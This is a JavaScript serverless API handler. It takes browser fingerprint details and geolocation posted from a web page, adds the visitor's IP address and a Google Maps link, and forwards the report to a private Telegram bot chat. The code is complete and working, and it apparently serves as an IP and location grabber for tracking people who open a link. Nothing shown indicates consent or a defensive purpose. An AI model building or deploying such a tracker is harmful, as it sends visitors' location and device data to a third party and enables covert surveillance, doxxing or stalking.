export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ success: false });
  }

  const data = req.body || {};

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.headers["x-real-ip"] ||
    req.socket?.remoteAddress ||
    "Unknown";

  let message = `**New Browser & Location Info:**\n\n`;
  message += `Time: ${data.timestamp || new Date().toLocaleString()}\n`;
  message += `IP: ${ip}\n\n`;

  if (data.browser) {
    message += `User-Agent: ${data.browser.userAgent || "Unknown"}\n`;
    message += `Platform: ${data.browser.platform || "Unknown"}\n`;
    message += `Languages: ${data.browser.languages || "Unknown"}\n`;
    message += `Screen: ${data.browser.screen || "Unknown"}\n`;
    message += `Timezone: ${data.browser.timezone || "Unknown"}\n`;
    message += `Hardware: ${data.browser.hardwareConcurrency || "?"} cores, ${data.browser.deviceMemory || "?"}GB RAM\n`;
    message += `Connection: ${data.browser.connection?.type || data.browser.connection || "Unknown"}\n`;
  }

  if (data.geo) {
    message += `\n**Location:** ${data.geo}\n`;
    if (data.mapLink) {
      message += `Google Maps: ${data.mapLink}\n`;
    }
  }

  try {
    const telegramRes = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      }
    );

    const telegramData = await telegramRes.json();

    if (!telegramRes.ok || !telegramData.ok) {
      return res.status(500).json({ success: false });
    }

    return res.status(200).json({ success: true });
  } catch {
    return res.status(500).json({ success: false });
  }
}
